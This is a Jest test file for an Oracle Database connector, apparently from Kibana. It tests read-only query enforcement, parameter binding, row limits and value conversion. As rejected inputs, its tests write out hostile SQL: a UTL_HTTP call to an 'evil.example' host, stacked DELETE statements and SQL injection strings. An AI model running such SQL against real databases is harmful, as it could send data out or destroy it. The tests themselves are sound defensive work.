/*
 * Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
 * or more contributor license agreements. Licensed under the "Elastic License
 * 2.0", the "GNU Affero General Public License v3.0 only", and the "Server Side
 * Public License v 1"; you may not use this file except in compliance with, at
 * your election, the "Elastic License 2.0", the "GNU Affero General Public
 * License v3.0 only", or the "Server Side Public License, v 1".
 */

import type { ActionContext, ConnectorSpec } from '../../connector_spec';
import { setResponseLimit } from '../../lib/clients/mssql_response_limit';

jest.mock('oracledb', () => ({
  OUT_FORMAT_OBJECT: 4002,
  BLOB: 2019,
  CLOB: 2017,
  DB_TYPE_TIMESTAMP_TZ: 2022,
  DB_TYPE_TIMESTAMP_LTZ: 2023,
}));

type Row = Record<string, unknown>;
type Respond = (sql: string, binds: Record<string, unknown>) => Row[];

interface QueryCall {
  sql: string;
  binds: Record<string, unknown>;
  options: Record<string, unknown>;
}

// Minimal stand-in for an oracledb Pool: each getConnection() returns a connection whose queryStream() replays
// whatever `respond` returns for that SQL, and which records the calls made on it.
const makePool = (
  respond: Respond,
  executeResult: Record<string, unknown> = {},
  metadata: Array<{ name: string; dbType?: number }> = []
) => {
  const queries: QueryCall[] = [];
  const events: string[] = [];
  const streams: Array<{ destroy: jest.Mock }> = [];
  const connections: Array<{ close: jest.Mock; rollback: jest.Mock; execute: jest.Mock }> = [];
  const pool = {
    getConnection: jest.fn(async () => {
      const connection = {
        execute: jest.fn(async (sql: string) => {
          events.push(`execute:${sql}`);
          return sql === 'SET TRANSACTION READ ONLY' ? {} : executeResult;
        }),
        queryStream: jest.fn(
          (sql: string, binds: Record<string, unknown>, options: Record<string, unknown>) => {
            queries.push({ sql, binds, options });
            const rows = respond(sql, binds);
            const stream = {
              destroy: jest.fn(),
              on: jest.fn((event: string, handler: (md: unknown) => void) => {
                if (event === 'metadata') handler(metadata);
              }),
              async *[Symbol.asyncIterator]() {
                for (const row of rows) yield row;
              },
            };
            streams.push(stream);
            return stream;
          }
        ),
        rollback: jest.fn(async () => {
          events.push('rollback');
        }),
        close: jest.fn(async () => {
          events.push('close');
        }),
      };
      connections.push(connection);
      return connection;
    }),
  };
  return { pool, queries, events, streams, connections };
};

const makeContext = (pool: unknown): ActionContext =>
  ({
    config: { host: 'db.example.com', port: 1521, serviceName: 'ORCLPDB1' },
    log: { info: jest.fn(), debug: jest.fn(), error: jest.fn() },
    getClient: jest.fn().mockResolvedValue(pool),
  } as unknown as ActionContext);

const makeConfig = (overrides: Record<string, unknown> = {}) => ({
  host: 'db.example.com',
  port: 1521,
  serviceName: 'ORCLPDB1',
  ...overrides,
});

const rowsOf = (count: number): Row[] => Array.from({ length: count }, (_, id) => ({ ID: id }));

const columnRows = (...names: string[]): Row[] =>
  names.map((name, index) => ({ name, position: index + 1, dataType: 'VARCHAR2' }));

describe('OracleConnector', () => {
  let OracleConnector: ConnectorSpec;
  let configSchema: NonNullable<ConnectorSpec['schema']>;

  const action = (name: string) => {
    const found = OracleConnector.actions[name];
    if (!found) throw new Error(`missing action ${name}`);
    return found;
  };

  beforeEach(() => {
    ({ OracleConnector } = require('./oracle'));
    if (!OracleConnector.schema) {
      throw new Error('Oracle spec is missing a config schema');
    }
    configSchema = OracleConnector.schema;
  });

  describe('metadata', () => {
    it('has the correct connector id and display name', () => {
      expect(OracleConnector.metadata.id).toBe('.oracle');
      expect(OracleConnector.metadata.displayName).toBe('Oracle Database');
    });

    it('uses basic auth so credentials are encrypted, not stored in schema', () => {
      expect(OracleConnector.auth?.types).toEqual(['basic']);
      expect(configSchema.shape).not.toHaveProperty('username');
      expect(configSchema.shape).not.toHaveProperty('password');
    });

    it('supports agentBuilder only (workflows added in a follow-up)', () => {
      expect(OracleConnector.metadata.supportedFeatureIds).toEqual(['agentBuilder']);
    });

    it('keeps the test button enabled', () => {
      expect(OracleConnector.test?.enabled).toBe(true);
    });
  });

  describe('schema', () => {
    it('accepts a fully populated config', () => {
      expect(configSchema.safeParse(makeConfig()).success).toBe(true);
    });

    it('defaults port to 1521', () => {
      const config = makeConfig();
      delete (config as Record<string, unknown>).port;
      expect(configSchema.parse(config).port).toBe(1521);
    });

    it("defaults ssl to 'required' and only accepts required or disabled", () => {
      expect(configSchema.parse(makeConfig()).ssl).toBe('required');
      expect(configSchema.safeParse(makeConfig({ ssl: 'disabled' })).success).toBe(true);
      expect(configSchema.safeParse(makeConfig({ ssl: 'optional' })).success).toBe(false);
    });

    it('rejects an out-of-range port', () => {
      expect(configSchema.safeParse(makeConfig({ port: 70000 })).success).toBe(false);
    });

    it('rejects a host with a protocol prefix', () => {
      expect(configSchema.safeParse(makeConfig({ host: 'tcps://x.example.com' })).success).toBe(
        false
      );
    });

    it.each(['host', 'serviceName'])('rejects a config missing %s', (field) => {
      const config = makeConfig();
      delete (config as Record<string, unknown>)[field];
      expect(configSchema.safeParse(config).success).toBe(false);
    });

    it.each(['orcl/pdb', 'svc?x=1', 'a b', '(DESCRIPTION=)', 'svc:1521'])(
      'rejects the service name %s, which could alter the connect string',
      (serviceName) => {
        expect(configSchema.safeParse(makeConfig({ serviceName })).success).toBe(false);
      }
    );

    it.each(['ORCLPDB1', 'orcl.example.com', 'my_svc-1'])('accepts the service name %s', (name) => {
      expect(configSchema.safeParse(makeConfig({ serviceName: name })).success).toBe(true);
    });
  });

  describe('tool exposure and scope', () => {
    it.each(['query', 'listSchemas', 'listTables', 'describeTable', 'searchRows'])(
      '%s is an agent tool with read scope',
      (name) => {
        expect(action(name).isTool).toBe(true);
        expect(action(name).scope).toBe('read');
      }
    );

    it('keeps executeSql out of the agent tools and marks it destroy', () => {
      expect(action('executeSql').isTool).toBe(false);
      expect(action('executeSql').scope).toBe('destroy');
    });
  });

  describe('query', () => {
    const query = (ctx: ActionContext, input: Record<string, unknown>) =>
      action('query').handler(ctx, input);

    it('runs inside a read-only transaction and rolls back before releasing the connection', async () => {
      const { pool, events } = makePool(() => rowsOf(2));

      const result = await query(makeContext(pool), { sql: 'SELECT ID FROM T' });

      expect(result).toEqual({ rows: rowsOf(2), rowCount: 2, truncated: false });
      expect(events).toEqual(['execute:SET TRANSACTION READ ONLY', 'rollback', 'close']);
    });

    it('streams object-format rows with a bounded fetch size', async () => {
      const { pool, queries } = makePool(() => []);

      await query(makeContext(pool), { sql: 'SELECT ID FROM T', maxRows: 10 });

      expect(queries[0].options).toEqual({ outFormat: 4002, fetchArraySize: 11 });
    });

    it('removes a trailing semicolon, which Oracle rejects', async () => {
      const { pool, queries } = makePool(() => []);

      await query(makeContext(pool), { sql: 'SELECT 1 FROM DUAL;' });

      expect(queries[0].sql).toBe('SELECT 1 FROM DUAL');
    });

    it.each([
      ['INSERT INTO T VALUES (1)'],
      ['DELETE FROM T'],
      ['SELECT 1 FROM DUAL; DELETE FROM T'],
      ['SELECT * FROM T FOR UPDATE'],
      ["SELECT UTL_HTTP.REQUEST('http://evil.example') FROM DUAL"],
      ['SELECT * FROM T@LINK'],
      ['WITH FUNCTION F RETURN NUMBER IS BEGIN RETURN 1; END; SELECT F FROM DUAL'],
      ['BEGIN NULL; END;'],
    ])('rejects %s without touching the database', async (sql) => {
      const { pool } = makePool(() => []);
      const ctx = makeContext(pool);

      await expect(query(ctx, { sql })).rejects.toThrow();
      expect(ctx.getClient).not.toHaveBeenCalled();
    });

    it('allows write keywords that appear only inside a literal or comment', async () => {
      const { pool } = makePool(() => []);

      await expect(
        query(makeContext(pool), { sql: `SELECT 'DROP TABLE x' AS n FROM DUAL -- DELETE` })
      ).resolves.toMatchObject({ truncated: false });
    });

    it('stops at maxRows, marks the result truncated, and closes the cursor', async () => {
      const { pool, streams } = makePool(() => rowsOf(10));

      const result = await query(makeContext(pool), { sql: 'SELECT ID FROM T', maxRows: 3 });

      expect(result).toEqual({ rows: rowsOf(3), rowCount: 3, truncated: true });
      expect(streams[0].destroy).toHaveBeenCalled();
    });

    it('defaults to 100 rows', async () => {
      const { pool } = makePool(() => rowsOf(150));

      const result = (await query(makeContext(pool), { sql: 'SELECT ID FROM T' })) as {
        rowCount: number;
        truncated: boolean;
      };

      expect(result.rowCount).toBe(100);
      expect(result.truncated).toBe(true);
    });

    it('stops retaining rows at the Actions maximum response size', async () => {
      const { pool } = makePool(() =>
        Array.from({ length: 50 }, () => ({ DATA: 'x'.repeat(100) }))
      );
      setResponseLimit(pool, 1000);

      const result = (await query(makeContext(pool), { sql: 'SELECT DATA FROM T' })) as {
        rowCount: number;
        truncated: boolean;
      };

      expect(result.truncated).toBe(true);
      expect(result.rowCount).toBeGreaterThan(0);
      expect(result.rowCount).toBeLessThan(10);
    });

    it('still rolls back and releases the connection when the query fails', async () => {
      const { pool, events } = makePool(() => []);
      const failing = await pool.getConnection();
      failing.queryStream = jest.fn(() => {
        throw new Error('ORA-00942: table or view does not exist');
      }) as never;
      pool.getConnection.mockResolvedValueOnce(failing);
      events.length = 0;

      await expect(query(makeContext(pool), { sql: 'SELECT 1 FROM MISSING' })).rejects.toThrow(
        'ORA-00942'
      );
      expect(failing.rollback).toHaveBeenCalled();
      expect(failing.close).toHaveBeenCalled();
    });

    describe('retrying ORA-01466 (table definition changed a moment ago)', () => {
      const ddlError = () =>
        new Error('ORA-01466: unable to read data - table definition has changed');

      beforeEach(() => jest.useFakeTimers());
      afterEach(() => jest.useRealTimers());

      it('retries the read until the table becomes readable', async () => {
        let calls = 0;
        const { pool } = makePool(() => {
          calls++;
          if (calls <= 2) throw ddlError();
          return rowsOf(1);
        });

        const promise = query(makeContext(pool), { sql: 'SELECT ID FROM T' });
        await jest.advanceTimersByTimeAsync(2000);

        await expect(promise).resolves.toMatchObject({ rowCount: 1 });
        expect(calls).toBe(3);
      });

      it('gives up after three attempts', async () => {
        let calls = 0;
        const { pool } = makePool(() => {
          calls++;
          throw ddlError();
        });

        const promise = query(makeContext(pool), { sql: 'SELECT ID FROM T' });
        const rejection = expect(promise).rejects.toThrow('ORA-01466');
        await jest.advanceTimersByTimeAsync(5000);

        await rejection;
        expect(calls).toBe(3);
      });

      it('does not retry other errors', async () => {
        let calls = 0;
        const { pool } = makePool(() => {
          calls++;
          throw new Error('ORA-00942: table or view does not exist');
        });

        await expect(query(makeContext(pool), { sql: 'SELECT ID FROM T' })).rejects.toThrow(
          'ORA-00942'
        );
        expect(calls).toBe(1);
      });
    });

    it('converts dates, RAW values, and LOBs into JSON-safe values', async () => {
      const clob = {
        type: 2017,
        length: 5,
        chunkSize: 8132,
        getData: jest.fn().mockResolvedValue('hello'),
        destroy: jest.fn(),
      };
      const longClob = {
        type: 2017,
        length: 25000,
        chunkSize: 8132,
        getData: jest.fn().mockResolvedValue('a'.repeat(10000)),
        destroy: jest.fn(),
      };
      const blob = {
        type: 2019,
        length: 4096,
        chunkSize: 8132,
        getData: jest.fn(),
        destroy: jest.fn(),
      };
      const { pool } = makePool(
        () => [
          {
            WHEN: new Date(2026, 0, 2, 3, 4, 5),
            WHEN_MS: new Date(2026, 11, 31, 23, 59, 59, 120),
            AT_ZONE: new Date('2026-01-02T03:04:05.000Z'),
            BAD_DATE: new Date(NaN),
            RAW_COL: Buffer.from([0xde, 0xad]),
            NOTE: clob,
            LONG_NOTE: longClob,
            IMAGE: blob,
            N: 7,
            NIL: null,
          },
        ],
        {},
        [{ name: 'AT_ZONE', dbType: 2022 }]
      );

      const result = (await query(makeContext(pool), { sql: 'SELECT * FROM T' })) as {
        rows: Row[];
      };

      expect(result.rows[0]).toEqual({
        WHEN: '2026-01-02T03:04:05',
        WHEN_MS: '2026-12-31T23:59:59.120',
        AT_ZONE: '2026-01-02T03:04:05.000Z',
        BAD_DATE: null,
        RAW_COL: 'dead',
        NOTE: 'hello',
        LONG_NOTE: `${'a'.repeat(10000)}… [truncated, 25000 characters total]`,
        IMAGE: '[BLOB, 4096 bytes]',
        N: 7,
        NIL: null,
      });
      expect(blob.getData).not.toHaveBeenCalled();
      expect(clob.destroy).toHaveBeenCalled();
      expect(blob.destroy).toHaveBeenCalled();
    });
  });

  describe('listSchemas', () => {
    it('lists the schemas visible to the user', async () => {
      const { pool, queries } = makePool(() => [{ name: 'HR' }]);

      const result = await action('listSchemas').handler(makeContext(pool), {});

      expect(result).toMatchObject({ rows: [{ name: 'HR' }] });
      expect(queries[0].sql).toContain('FROM ALL_USERS');
    });
  });

  describe('listTables', () => {
    const respondWithSchema =
      (rows: Row[]): Respond =>
      (sql) =>
        sql.includes('SYS_CONTEXT') ? [{ schema: 'APP' }] : rows;

    it('defaults to the schema of the connected user', async () => {
      const { pool, queries } = makePool(respondWithSchema([{ schema: 'APP', name: 'T' }]));

      await action('listTables').handler(makeContext(pool), {});

      expect(queries).toHaveLength(2);
      expect(queries[1].binds).toEqual({ t0: 'APP', v0: 'APP' });
      expect(queries[1].sql).toContain('FROM ALL_TABLES');
      expect(queries[1].sql).toContain('FROM ALL_VIEWS');
    });

    it('matches the schema as written and in upper case, without asking for the current schema', async () => {
      const { pool, queries } = makePool(() => []);

      await action('listTables').handler(makeContext(pool), { schema: 'hr' });

      expect(queries).toHaveLength(1);
      expect(queries[0].binds).toEqual({ t0: 'hr', v0: 'hr', t1: 'HR', v1: 'HR' });
      expect(queries[0].sql).toContain('OWNER IN (:t0, :t1)');
    });

    it('binds a schema that is already upper case once', async () => {
      const { pool, queries } = makePool(() => []);

      await action('listTables').handler(makeContext(pool), { schema: 'HR' });

      expect(queries[0].binds).toEqual({ t0: 'HR', v0: 'HR' });
    });

    it('never interpolates the schema into the SQL', async () => {
      const { pool, queries } = makePool(() => []);

      await action('listTables').handler(makeContext(pool), { schema: "X' OR '1'='1" });

      expect(queries[0].sql).not.toContain("OR '1'");
    });
  });

  describe('describeTable', () => {
    const describeResponder =
      (known: { schema: string; table: string }): Respond =>
      (sql, binds) => {
        if (sql.includes('SYS_CONTEXT')) return [{ schema: 'APP' }];
        if (sql.includes('FROM ALL_TAB_COLUMNS')) {
          return binds.ownerName === known.schema && binds.tableName === known.table
            ? columnRows('ID', 'NAME')
            : [];
        }
        if (sql.includes("CONSTRAINT_TYPE IN ('P', 'U')")) {
          return [{ name: 'PK_T', type: 'PRIMARY KEY', columnName: 'ID', position: 1 }];
        }
        return [
          {
            name: 'FK_T',
            columnName: 'OWNER_ID',
            referencedSchema: 'APP',
            referencedTable: 'OWNERS',
            referencedColumn: 'ID',
          },
        ];
      };

    it('returns columns, constraints, and foreign keys for the table', async () => {
      const { pool } = makePool(describeResponder({ schema: 'HR', table: 'EMPLOYEES' }));

      const result = await action('describeTable').handler(makeContext(pool), {
        table: 'EMPLOYEES',
        schema: 'HR',
      });

      expect(result).toEqual({
        schema: 'HR',
        table: 'EMPLOYEES',
        columns: columnRows('ID', 'NAME'),
        constraints: [{ name: 'PK_T', type: 'PRIMARY KEY', columnName: 'ID', position: 1 }],
        foreignKeys: [
          {
            name: 'FK_T',
            columnName: 'OWNER_ID',
            referencedSchema: 'APP',
            referencedTable: 'OWNERS',
            referencedColumn: 'ID',
          },
        ],
        truncated: false,
      });
    });

    it('falls back to the upper-case schema and table names', async () => {
      const { pool } = makePool(describeResponder({ schema: 'HR', table: 'EMPLOYEES' }));

      const result = (await action('describeTable').handler(makeContext(pool), {
        table: 'employees',
        schema: 'hr',
      })) as { schema: string; table: string };

      expect(result).toMatchObject({ schema: 'HR', table: 'EMPLOYEES' });
    });

    it('defaults to the schema of the connected user', async () => {
      const { pool } = makePool(describeResponder({ schema: 'APP', table: 'T' }));

      const result = await action('describeTable').handler(makeContext(pool), { table: 'T' });

      expect(result).toMatchObject({ schema: 'APP', table: 'T' });
    });

    it('explains how to recover when the table is not found', async () => {
      const { pool } = makePool(() => []);

      await expect(
        action('describeTable').handler(makeContext(pool), { table: 'NOPE', schema: 'HR' })
      ).rejects.toThrow(/NOPE was not found.*listTables/);
    });

    it('reports truncated when any metadata query was cut off', async () => {
      const { pool } = makePool(describeResponder({ schema: 'HR', table: 'T' }));
      setResponseLimit(pool, 50);

      const result = (await action('describeTable').handler(makeContext(pool), {
        table: 'T',
        schema: 'HR',
      })) as { truncated: boolean };

      expect(result.truncated).toBe(true);
    });
  });

  describe('searchRows', () => {
    const searchResponder =
      (rows: Row[]): Respond =>
      (sql) => {
        if (sql.includes('SYS_CONTEXT')) return [{ schema: 'HR' }];
        if (sql.includes('FROM ALL_TAB_COLUMNS')) return columnRows('LAST_NAME', 'EMAIL');
        return rows;
      };

    it('searches with one bind per column, an escaped lower-cased pattern, and a bounded fetch', async () => {
      const { pool, queries } = makePool(searchResponder([{ LAST_NAME: 'King' }]));

      const result = await action('searchRows').handler(makeContext(pool), {
        table: 'EMPLOYEES',
        schema: 'HR',
        searchTerm: '50%_King',
        columns: ['LAST_NAME', 'EMAIL'],
        maxRows: 5,
      });

      const search = queries[queries.length - 1];
      expect(search.sql).toBe(
        `SELECT * FROM "HR"."EMPLOYEES" WHERE LOWER("LAST_NAME") LIKE :p0 ESCAPE '!' ` +
          `OR LOWER("EMAIL") LIKE :p1 ESCAPE '!' FETCH FIRST 6 ROWS ONLY`
      );
      expect(search.binds).toEqual({ p0: '%50!%!_king%', p1: '%50!%!_king%' });
      expect(result).toMatchObject({ rows: [{ LAST_NAME: 'King' }], truncated: false });
    });

    it('matches column names as written, then in upper case, and quotes the real names', async () => {
      const { pool, queries } = makePool(searchResponder([]));

      await action('searchRows').handler(makeContext(pool), {
        table: 'EMPLOYEES',
        schema: 'HR',
        searchTerm: 'x',
        columns: ['last_name'],
      });

      expect(queries[queries.length - 1].sql).toContain('LOWER("LAST_NAME")');
    });

    it('rejects a column that does not exist, so no identifier from the agent reaches the SQL', async () => {
      const { pool, queries } = makePool(searchResponder([]));

      await expect(
        action('searchRows').handler(makeContext(pool), {
          table: 'EMPLOYEES',
          schema: 'HR',
          searchTerm: 'x',
          columns: ['NAME") OR 1=1 --'],
        })
      ).rejects.toThrow(/was not found in HR\.EMPLOYEES/);
      expect(queries.every((q) => !q.sql.includes('1=1'))).toBe(true);
    });

    it('marks the result truncated when more rows match than maxRows', async () => {
      const { pool } = makePool(searchResponder(rowsOf(4)));

      const result = (await action('searchRows').handler(makeContext(pool), {
        table: 'EMPLOYEES',
        schema: 'HR',
        searchTerm: 'x',
        columns: ['EMAIL'],
        maxRows: 3,
      })) as { rowCount: number; truncated: boolean };

      expect(result).toMatchObject({ rowCount: 3, truncated: true });
    });
  });

  describe('executeSql', () => {
    const execute = (ctx: ActionContext, sql: string) => action('executeSql').handler(ctx, { sql });

    it('commits, reports rowsAffected, and drops the connection so session state cannot leak', async () => {
      const { pool, connections } = makePool(() => [], { rowsAffected: 3 });

      const result = await execute(makeContext(pool), 'UPDATE T SET A = 1');

      expect(result).toEqual({ rows: [], rowCount: 0, rowsAffected: 3, truncated: false });
      expect(connections[0].execute).toHaveBeenCalledWith(
        'UPDATE T SET A = 1',
        {},
        { outFormat: 4002, autoCommit: true, maxRows: 1001 }
      );
      expect(connections[0].close).toHaveBeenCalledWith({ drop: true });
    });

    it('does not apply the read-only guard or the read-only transaction', async () => {
      const { pool, connections } = makePool(() => [], { rowsAffected: 0 });

      await expect(execute(makeContext(pool), 'DROP TABLE T')).resolves.toBeDefined();
      expect(connections[0].execute).not.toHaveBeenCalledWith('SET TRANSACTION READ ONLY');
    });

    it('treats zone-aware timestamp columns as instants and other dates as wall-clock values', async () => {
      const { pool } = makePool(() => [], {
        rows: [{ TS: new Date('2026-01-02T03:04:05.000Z'), D: new Date(2026, 0, 2, 3, 4, 5) }],
        metaData: [
          { name: 'TS', dbType: 2023 },
          { name: 'D', dbType: 2012 },
        ],
      });

      const result = (await execute(makeContext(pool), 'SELECT TS, D FROM T')) as { rows: Row[] };

      expect(result.rows[0]).toEqual({ TS: '2026-01-02T03:04:05.000Z', D: '2026-01-02T03:04:05' });
    });

    it('returns at most 1000 output rows and marks the result truncated', async () => {
      const { pool } = makePool(() => [], { rows: rowsOf(1001) });

      const result = (await execute(makeContext(pool), 'SELECT ID FROM T')) as {
        rowCount: number;
        truncated: boolean;
      };

      expect(result).toMatchObject({ rowCount: 1000, truncated: true });
    });

    it('drops the connection even when the statement fails', async () => {
      const { pool } = makePool(() => []);
      const failing = await pool.getConnection();
      failing.execute = jest.fn().mockRejectedValue(new Error('ORA-00942'));
      pool.getConnection.mockResolvedValueOnce(failing);

      await expect(execute(makeContext(pool), 'SELECT 1 FROM MISSING')).rejects.toThrow(
        'ORA-00942'
      );
      expect(failing.close).toHaveBeenCalledWith({ drop: true });
    });
  });

  describe('test', () => {
    it('verifies the connection with a lightweight query', async () => {
      const { pool, queries } = makePool(() => [{ 1: 1 }]);

      const result = await OracleConnector.test?.handler(makeContext(pool));

      expect(queries[0].sql).toBe('SELECT 1 FROM DUAL');
      expect(result).toEqual({ message: 'Successfully connected to Oracle Database' });
    });
  });
});
